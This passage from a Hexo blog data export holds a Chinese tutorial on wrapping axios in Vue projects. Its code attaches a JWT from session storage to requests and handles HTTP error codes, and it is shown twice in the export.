class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> axios <span class=\"keyword\">from</span> <span class=\"string\">\"axios\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> router <span class=\"keyword\">from</span> <span class=\"string\">\"../router\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; MessageBox, Message &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"element-ui\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> loginUrl = <span class=\"string\">\"/login\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 根据环境切换接口地址</span></span><br><span class=\"line\">axios.defaults.baseURL = process.env.VUE_APP_API;</span><br><span class=\"line\">axios.defaults.headers = &#123; <span class=\"string\">\"X-Requested-With\"</span>: <span class=\"string\">\"XMLHttpRequest\"</span> &#125;;</span><br><span class=\"line\">axios.defaults.timeout = <span class=\"number\">60000</span>;</span><br><span class=\"line\"><span class=\"comment\">// 请求拦截器</span></span><br><span class=\"line\">axios.interceptors.request.use(</span><br><span class=\"line\">  config =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (router.history.current.path !== loginUrl) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> token = <span class=\"built_in\">window</span>.sessionStorage.getItem(<span class=\"string\">\"token\"</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (token == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        router.replace(&#123;</span><br><span class=\"line\">          path: loginUrl,</span><br><span class=\"line\">          query: &#123; <span class=\"attr\">redirect</span>: router.currentRoute.fullPath &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        config.headers[<span class=\"string\">\"Authorization\"</span>] = <span class=\"string\">\"JWT \"</span> + token;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> config;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  error =&gt; &#123;</span><br><span class=\"line\">    Message.warning(error);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"comment\">// 响应拦截器</span></span><br><span class=\"line\">axios.interceptors.response.use(</span><br><span class=\"line\">  response =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response.data;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  error =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (error.response !== <span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (error.response.status) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">400</span>:</span><br><span class=\"line\">          MessageBox.alert(error.response.data);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">401</span>:</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.sessionStorage.getItem(<span class=\"string\">\"out\"</span>) === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">window</span>.sessionStorage.setItem(<span class=\"string\">\"out\"</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">            MessageBox.confirm(<span class=\"string\">\"会话已失效! 请重新登录\"</span>, <span class=\"string\">\"提示\"</span>, &#123;</span><br><span class=\"line\">              confirmButtonText: <span class=\"string\">\"重新登录\"</span>,</span><br><span class=\"line\">              cancelButtonText: <span class=\"string\">\"取消\"</span>,</span><br><span class=\"line\">              type: <span class=\"string\">\"warning\"</span></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">              .then(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">                router.replace(&#123;</span><br><span class=\"line\">                  path: loginUrl,</span><br><span class=\"line\">                  query: &#123; <span class=\"attr\">redirect</span>: router.currentRoute.fullPath &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">              &#125;)</span><br><span class=\"line\">              .catch(<span class=\"function\"><span class=\"params\">action</span> =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"built_in\">window</span>.sessionStorage.clear();</span><br><span class=\"line\">                <span class=\"built_in\">window</span>.localStorage.clear();</span><br><span class=\"line\">              &#125;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">402</span>:</span><br><span class=\"line\">          MessageBox.confirm(<span class=\"string\">\"登陆超时 ！\"</span>, <span class=\"string\">\"提示\"</span>, &#123;</span><br><span class=\"line\">            confirmButtonText: <span class=\"string\">\"重新登录\"</span>,</span><br><span class=\"line\">            cancelButtonText: <span class=\"string\">\"取消\"</span>,</span><br><span class=\"line\">            type: <span class=\"string\">\"warning\"</span></span><br><span class=\"line\">          &#125;).then(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            router.replace(&#123;</span><br><span class=\"line\">              path: loginUrl,</span><br><span class=\"line\">              query: &#123; <span class=\"attr\">redirect</span>: router.currentRoute.fullPath &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">          &#125;);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">403</span>:</span><br><span class=\"line\">          MessageBox.alert(<span class=\"string\">\"没有权限！\"</span>);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"comment\">// ...忽略</span></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">          MessageBox.alert(<span class=\"string\">`连接错误<span class=\"subst\">$&#123;error.response.status&#125;</span>`</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error.response);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"comment\">// 导出基础请求类型封装</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  get(url, param) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (param !== <span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">Object</span>.assign(param, &#123; <span class=\"attr\">_t</span>: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getTime() &#125;);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      param = &#123; <span class=\"attr\">_t</span>: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getTime() &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      axios(&#123; <span class=\"attr\">method</span>: <span class=\"string\">\"get\"</span>, url, <span class=\"attr\">params</span>: param &#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        resolve(res);</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  getData(url, param) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      axios(&#123; <span class=\"attr\">method</span>: <span class=\"string\">\"get\"</span>, url, <span class=\"attr\">params</span>: param &#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (res.code === <span class=\"number\">4000</span>) &#123;</span><br><span class=\"line\">          resolve(res.data);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          Message.warning(res.msg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  post(url, param, config) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      axios.post(url, param, config).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        resolve(res);</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  put: axios.put,</span><br><span class=\"line\">  _delete: axios.delete</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n<p>奇舞周刊</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>axios 二次封装的相关总结。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基础实现\"><a href=\"#基础实现\" class=\"headerlink\" title=\"基础实现\"></a>基础实现</h2><p>之所以需要二次封装，因为正常情况下，我们会针对错误之类的作统一处理，除了错误还有请求头，url 等，详细可参考 axios <a href=\"http://www.axios-js.com/\" target=\"_blank\" rel=\"noopener\">官方文档</a>。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// utils&gt;request.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> axios <span class=\"keyword\">from</span> <span class=\"string\">\"axios\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; notification &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">request</span>(<span class=\"params\">options</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> axios(options)</span><br><span class=\"line\">    .then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .catch(<span class=\"function\"><span class=\"params\">error</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> &#123;</span><br><span class=\"line\">        response: &#123; status, statusText &#125;</span><br><span class=\"line\">      &#125; = error;</span><br><span class=\"line\">      notification.error(&#123;</span><br><span class=\"line\">        <span class=\"comment\">// jsx语法美化提示信息展示样式</span></span><br><span class=\"line\">        message: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> (</span><br><span class=\"line\">          &lt;div&gt;</span><br><span class=\"line\">            请求错误 &lt;span style=<span class=\"string\">\"color: red\"</span>&gt;&#123;status&#125;&lt;<span class=\"regexp\">/span&gt; : &#123;options.url&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;/</span>div&gt;</span><br><span class=\"line\">        ),</span><br><span class=\"line\">        description: statusText</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> request;</span><br></pre></td></tr></table></figure>\n<h2 id=\"特别提示\"><a href=\"#特别提示\" class=\"headerlink\" title=\"特别提示\"></a>特别提示</h2><p>示例中 notification 的 message 部分使用了 jsx 语法，有关 vue 中使用 jsx 的方法如下：</p>\n<ol>\n<li>首先需要安装<code>@vue/babel-preset-jsx</code>和<code>@vue/babel-helper-vue-jsx-merge-props</code>；</li>\n<li>然后修改 babel 配置<code>presets: [&quot;@vue/app&quot;, &quot;@vue/babel-preset-jsx&quot;],</code>；</li>\n<li>最后在 vue 组件中使用，如上示例代码 message 部分。</li>\n</ol>\n<h2 id=\"进阶实现\"><a href=\"#进阶实现\" class=\"headerlink\" title=\"进阶实现\"></a>进阶实现</h2><p>以下是摘自<a href=\"https://mp.weixin.qq.com/s/eqgf9MLEcLrooBhzgCVV6A\" target=\"_blank\" rel=\"noopener\">奇舞周刊</a>公众号。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> axios <span class=\"keyword\">from</span> <span class=\"string\">\"axios\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> router <span class=\"keyword\">from</span> <span class=\"string\">\"../router\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; MessageBox, Message &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"element-ui\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> loginUrl = <span class=\"string\">\"/login\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 根据环境切换接口地址</span></span><br><span class=\"line\">axios.defaults.baseURL = process.env.VUE_APP_API;</span><br><span class=\"line\">axios.defaults.headers = &#123; <span class=\"string\">\"X-Requested-With\"</span>: <span class=\"string\">\"XMLHttpRequest\"</span> &#125;;</span><br><span class=\"line\">axios.defaults.timeout = <span class=\"number\">60000</span>;</span><br><span class=\"line\"><span class=\"comment\">// 请求拦截器</span></span><br><span class=\"line\">axios.interceptors.request.use(</span><br><span class=\"line\">  config =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (router.history.current.path !== loginUrl) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> token = <span class=\"built_in\">window</span>.sessionStorage.getItem(<span class=\"string\">\"token\"</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (token == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        router.replace(&#123;</span><br><span class=\"line\">          path: loginUrl,</span><br><span class=\"line\">          query: &#123; <span class=\"attr\">redirect</span>: router.currentRoute.fullPath &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        config.headers[<span class=\"string\">\"Authorization\"</span>] = <span class=\"string\">\"JWT \"</span> + token;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> config;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  error =&gt; &#123;</span><br><span class=\"line\">    Message.warning(error);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"comment\">// 响应拦截器</span></span><br><span class=\"line\">axios.interceptors.response.use(</span><br><span class=\"line\">  response =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response.data;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  error =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (error.response !== <span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (error.response.status) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">400</span>:</span><br><span class=\"line\">          MessageBox.alert(error.response.data);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">401</span>:</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.sessionStorage.getItem(<span class=\"string\">\"out\"</span>) === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">window</span>.sessionStorage.setItem(<span class=\"string\">\"out\"</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">            MessageBox.confirm(<span class=\"string\">\"会话已失效! 请重新登录\"</span>, <span class=\"string\">\"提示\"</span>, &#123;</span><br><span class=\"line\">              confirmButtonText: <span class=\"string\">\"重新登录\"</span>,</span><br><span class=\"line\">              cancelButtonText: <span class=\"string\">\"取消\"</span>,</span><br><span class=\"line\">              type: <span class=\"string\">\"warning\"</span></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">              .then(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">                router.replace(&#123;</span><br><span class=\"line\">                  path: loginUrl,</span><br><span class=\"line\">                  query: &#123; <span class=\"attr\">redirect</span>: router.currentRoute.fullPath &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">              &#125;)</span><br><span class=\"line\">              .catch(<span class=\"function\"><span class=\"params\">action</span> =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"built_in\">window</span>.sessionStorage.clear();</span><br><span class=\"line\">                <span class=\"built_in\">window</span>.localStorage.clear();</span><br><span class=\"line\">              &#125;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">402</span>:</span><br><span class=\"line\">          MessageBox.confirm(<span class=\"string\">\"登陆超时 ！\"</span>, <span class=\"string\">\"提示\"</span>, &#123;</span><br><span class=\"line\">            confirmButtonText: <span class=\"string\">\"重新登录\"</span>,</span><br><span class=\"line\">            cancelButtonText: <span class=\"string\">\"取消\"</span>,</span><br><span class=\"line\">            type: <span class=\"string\">\"warning\"</span></span><br><span class=\"line\">          &#125;).then(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            router.replace(&#123;</span><br><span class=\"line\">              path: loginUrl,</span><br><span class=\"line\">              query: &#123; <span class=\"attr\">redirect</span>: router.currentRoute.fullPath &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">          &#125;);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">403</span>:</span><br><span class=\"line\">          MessageBox.alert(<span class=\"string\">\"没有权限！\"</span>);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"comment\">// ...忽略</span></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">          MessageBox.alert(<span class=\"string\">`连接错误<span class=\"subst\">$&#123;error.response.status&#125;</span>`</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error.response);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"comment\">// 导出基础请求类型封装</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  get(url, param) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (param !== <span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">Object</span>.assign(param, &#123; <span class=\"attr\">_t</span>: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getTime() &#125;);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      param = &#123; <span class=\"attr\">_t</span>: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getTime() &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      axios(&#123; <span class=\"attr\">method</span>: <span class=\"string\">\"get\"</span>, url, <span class=\"attr\">params</span>: param &#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        resolve(res);</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  getData(url, param) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      axios(&#123; <span class=\"attr\">method</span>: <span class=\"string\">\"get\"</span>, url, <span class=\"attr\">params</span>: param &#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (res.code === <span class=\"number\">4000</span>) &#123;</span><br><span class=\"line\">          resolve(res.data);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          Message.warning(res.msg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  post(url, param, config) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      axios.post(url, param, config).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        resolve(res);</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  put: axios.put,</span><br><span class=\"line\">  _delete: axios.delete</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n<p>奇舞周刊</p>"},{"title":"Vue实战@高效的构建打包发布","date":"2019-05-28T23:28:59.000Z","updated":"2019-05-28T23:28:59.000Z","_content":"\n# 概述\n\n本文主要是针对 vue 项目的 webpack 打包文件大小优化相关讲解。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 